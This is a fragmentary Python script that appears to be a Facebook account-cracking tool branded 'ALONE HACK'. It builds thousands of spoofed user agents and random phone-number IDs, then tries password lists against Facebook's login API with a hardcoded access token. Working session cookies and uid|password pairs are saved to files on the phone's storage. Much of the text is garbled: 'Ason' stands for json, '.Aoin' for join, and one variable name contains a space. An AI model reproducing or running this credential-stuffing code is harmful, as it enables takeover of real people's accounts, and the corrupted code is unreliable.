...
try:
	import os,requests,Ason,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
...
import requests,Ason,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform,uuid
from bs4 import BeautifulSoup as sop	
print('[•] Aoin My Facebook Group')
...
usr=[]
try:
	Af=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in Af:
		usr.append(us)
except: pass
...
for Af in range(10000):
	...
	i='0'
	A=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{A}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V) {str(gt)}'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'A', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'A', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	...
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{A}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'A', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
...
for mtc in range(10000):
	rr=random.randint
	Af=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(Af)
...
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{ALONE KING  }\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{ALONE HACK 907}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{ALONE HACK 907}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{+93749594545 }\33[0;m
...
#<------[main-ua]---->
def ATAL():
    END = 'Mozilla/5.0 (Linux; Android 6.1.1; SM-A105F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=2.75,width=720,height=1612};FBLC/en_US;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/SM-A105F;FBSV/6.1.1;nullFBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.0 (Linux; U; Android {random.randint(4,13)}; SM-A105F Build/LMY47V.{random.randint(111,999)}.{random.randint(111,999)}) '+END
    return ua
...
def AFG():
		...
		mthd = input(' Choose: ')
		clear()
		print(' \n\033[1;32m [1] \033[1;33mAUST PUBG ID HACK (AFG) ')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.Aoin(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
...
AALONE 1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
AALONE  = random.choice(AALONE 1)
def fking1(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fblc = device['fblc']
                        fbcr = sim_id
                        FAA=random.choice(AALONE )
                        FAAA=random.choice(AALONE )
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        ...
                        adid = str(''.Aoin(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        Af =str(''.Aoin(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{Af}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        A1 = ''.Aoin(random.choice(digits) for _ in range(2))
                        Aazoest = li2+A1
                        ...
                        po = requests.post(url,data=data,headers=headers).Ason()
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print("")
                                        coki = ";".Aoin(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/A-ALONE -COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/A-ALONE -OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [AKING😢==>CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/AـKING-😢.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
